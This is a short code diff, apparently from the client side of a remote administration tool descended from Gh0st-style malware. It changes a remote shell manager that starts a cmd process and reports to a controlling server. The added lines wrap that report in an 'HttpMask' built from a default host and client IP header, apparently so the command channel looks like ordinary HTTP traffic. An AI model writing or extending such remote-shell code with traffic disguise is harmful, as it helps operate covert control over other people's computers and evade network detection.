@@ -96,8 +96,9 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
 	m_hShellProcessHandle   = pi.hProcess;    //保存Cmd进程的进程句柄和主线程句柄
 	m_hShellThreadHandle	= pi.hThread;
 
-	BYTE	bToken = TOKEN_SHELL_START;      //包含头文件 Common.h     
-	m_ClientObject->Send2Server((char*)&bToken, 1);
+	BYTE	bToken = TOKEN_SHELL_START;
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	m_ClientObject->Send2Server((char*)&bToken, 1, &mask);
 
 	WaitForDialogOpen();
 
